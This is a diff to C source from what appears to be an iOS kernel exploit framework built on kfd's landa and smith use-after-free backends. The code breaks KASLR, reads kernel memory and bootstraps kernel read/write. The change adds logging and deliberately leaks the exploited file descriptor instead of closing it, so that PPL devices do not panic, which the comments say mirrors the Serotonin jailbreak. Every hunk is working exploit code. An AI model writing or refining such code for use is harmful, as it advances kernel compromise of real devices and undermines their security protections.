@@ -157,9 +157,15 @@ static bool keKfdBootstrapPerf(void)
     u64 kbase = 0;
     if (!keKfdSlideViaAes(&slide)) {
         u64 task = keKfdKread64(kfd->info.kaddr.current_proc + dynamic_system_info.proc__task);
-        if (!task) return false;
+        if (!task) {
+            KE_LOG("kfd: perf bootstrap: current_proc->task read failed");
+            return false;
+        }
         kbase = keKfdBreakKaslr(task, &slide);
-        if (!kbase) return false;
+        if (!kbase) {
+            KE_LOG("kfd: perf bootstrap: kaslr break failed");
+            return false;
+        }
     } else {
         kbase = KE_AES_LINK_ADDR + slide;
     }
@@ -367,7 +373,9 @@ int keKfdInit(KEBackendID backend, const KEConfig *config)
 
     keKfdSyncRuntimeGlobals();
     if (!gKeKfdCurrentProc || !gKeRuntimeProcObjectSize) {
-        kclose(g_kfd);
+        // NEVER deallocate: kclose -> landa deallocate panics on PPL devices
+        // ("page still has mappings"). Leak the kfd like Serotonin.
+        KE_LOG("kfd: runtime globals missing, leaking kfd (no deallocate)");
         g_kfd = 0;
         return KE_ERR_OFFSETS_MISSING;
     }
@@ -377,8 +385,8 @@ int keKfdInit(KEBackendID backend, const KEConfig *config)
 
     if (!perf) {
         // Without a clean write primitive, extmod zeroing stays disabled.
-        KE_LOG("kfd: perf krw unavailable, deallocating puaf (safe mode)");
-        kclose(g_kfd);
+        // NEVER kclose here: deallocate panics the kernel on PPL devices.
+        KE_LOG("kfd: perf krw unavailable, leaking kfd (no deallocate)");
         g_kfd = 0;
         return KE_ERR_EXPLOIT_FAILED;
     }
@@ -399,8 +407,12 @@ static int keKfdInitSmith(const KEConfig *config)   { return keKfdInit(KE_BACKEN
 
 static void keKfdDeinit(void)
 {
+    // NEVER call kclose: landa deallocate panics the kernel on PPL
+    // devices ("pmap_mark_page_as_ppl_page_internal: page still has
+    // mappings"). Claimed puaf pages leak until reboot, exactly like
+    // Serotonin (do_kclose is never invoked after a successful kopen).
     if (g_kfd) {
-        kclose(g_kfd);
+        KE_LOG("kfd: deinit, leaking kfd (never deallocate on PPL)");
         g_kfd = 0;
     }
     gKeKfdKernelProc = 0;
